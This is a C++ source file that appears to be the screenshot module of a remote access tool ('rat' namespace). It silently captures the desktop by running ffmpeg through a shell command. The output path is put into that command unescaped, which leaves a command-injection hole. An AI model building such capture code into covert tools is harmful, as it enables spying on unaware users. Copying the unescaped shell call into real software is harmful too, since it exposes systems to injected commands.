#include <filesystem>
#include <string>
#include <fmt/core.h>
#include <cstdlib>
#include <array>
#include <cstdio>

#ifdef _WIN32
#include <windows.h>
#endif

namespace rat::media::screenshot {

struct Resolution {
    uint16_t width;
    uint16_t height;

    std::string toString() const {
        return fmt::format("{}x{}", width, height);
    }
    double getRatio() const {
        return static_cast<double>(width) / static_cast<double>(height);
    }
};

// --- Helpers ---
static inline std::string run_command(const std::string& cmd) {
    std::array<char, 128> buffer{};
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return {};
    while (fgets(buffer.data(), buffer.size(), pipe)) {
        result += buffer.data();
    }
    pclose(pipe);
    if (!result.empty() && result.back() == '\n')
        result.pop_back();
    return result;
}

bool is_ffmpeg_available() {
#ifdef _WIN32
    return !run_command("where ffmpeg").empty();
#else
    return !run_command("command -v ffmpeg").empty();
#endif
}

std::string get_ffmpeg_version() {
    return run_command("ffmpeg -version | head -n1");
}

// no X11 — let ffmpeg decide resolution
Resolution get_display_resolution(uint8_t /*display_id*/ = 0) {
#ifdef _WIN32
    return {
        static_cast<uint16_t>(GetSystemMetrics(SM_CXSCREEN)),
        static_cast<uint16_t>(GetSystemMetrics(SM_CYSCREEN))
    };
#else
    return {1920, 1080}; // dummy fallback (ffmpeg handles real capture)
#endif
}

uint8_t get_display_count() {
#ifdef _WIN32
    return static_cast<uint8_t>(GetSystemMetrics(SM_CMONITORS));
#else
    return 1; // we don't query monitors anymore
#endif
}

// --- Main function ---
bool takeScreenshot(const std::filesystem::path& Output_Path, std::string& Output_Buffer) {
    if (Output_Path.empty()) {
        Output_Buffer = "Output path is empty";
        return false;
    }

    if (!is_ffmpeg_available()) {
        Output_Buffer = "ffmpeg not available in PATH";
        return false;
    }

#ifdef _WIN32
    Resolution res = get_display_resolution();
    std::string cmd = fmt::format(
        "ffmpeg -y -f gdigrab -framerate 1 -video_size {} -i desktop -frames:v 1 \"{}\" >nul 2>&1",
        res.toString(),
        Output_Path.string()
    );
#else
    // No -video_size → ffmpeg captures native resolution
    std::string cmd = fmt::format(
        "ffmpeg -y -f x11grab -i :0.0 -frames:v 1 \"{}\" >/dev/null 2>&1",
        Output_Path.string()
    );
#endif

    int ret = std::system(cmd.c_str());
    if (ret != 0 || !std::filesystem::exists(Output_Path)) {
        Output_Buffer = "ffmpeg failed to capture screenshot";
        return false;
    }

    return true;
}

} // namespace rat::media::screenshot

